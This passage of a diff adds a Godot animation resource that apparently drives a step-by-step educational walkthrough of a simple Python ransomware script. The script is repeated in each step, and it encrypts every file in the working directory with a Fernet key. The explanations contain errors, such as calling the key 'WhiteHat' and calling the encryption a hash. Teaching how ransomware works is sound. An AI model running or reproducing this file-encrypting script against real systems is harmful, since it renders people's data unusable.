+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Certain files are skipped:
+The program file itself [wave](malware.py) [/wave]
+The encryption key file 
+[wave](key.key)[/wave]
+And a possible decryption script
+[wave] (decr.py) [/wave]
+These are skipped so the program doesn’t lock itself or make the key unreachable."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.375)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.77, 1.16)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_vuf0p"]
+resource_name = "ransomware_step_06"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["If an file is confirmed to be an actual file (not a folder), it is added to the list \"allfiles[]\""]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.635)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.625)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_gu46y"]
+resource_name = "ransomware_step_07"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Here, the list is printed out so we can see which files are going to be encrypted"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.22)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.315)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_de0th"]
+resource_name = "ransomware_step_08"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program calls Fernet.generate_key(), where it creates a new password key with a randomized set of characters, but this time it is set to \"WhiteHat\".
+
+ This key is what will lock and later unlock the files. Without it, the encrypted files are useless, because nobody can read them."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Creating the Password Key"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.115)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.315)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_31cwg"]
+resource_name = "ransomware_step_09"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program then saves this key into a file called key.key, using binary write mode (wb).
+
+At this stage, the program has created the “master key” and stored it safely in a separate file."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Creating the Password Key"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.43)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.6)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_x5n46"]
+resource_name = "ransomware_step_10"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Here’s where the real work happens:
+
+The program loops through every file in the allfiles list.
+
+Each file is opened in binary read mode (rb) so the raw data can be read."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.41)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.855)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_x2hu1"]
+resource_name = "ransomware_step_11"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash)."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.29)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.3)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_8yhgl"]
+resource_name = "ransomware_step_12"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [" Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).
+
+At this point, the files are no longer usable in their normal form — they have been locked with the password key."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.615)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.59)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_h0h0r"]
+resource_name = "ransomware_step_13"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program prints a message to confirm that all the files have been encrypted."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Final Confirmation"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_fkojw"]
+resource_name = "ransomware_step_14"
+length = 3.0
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
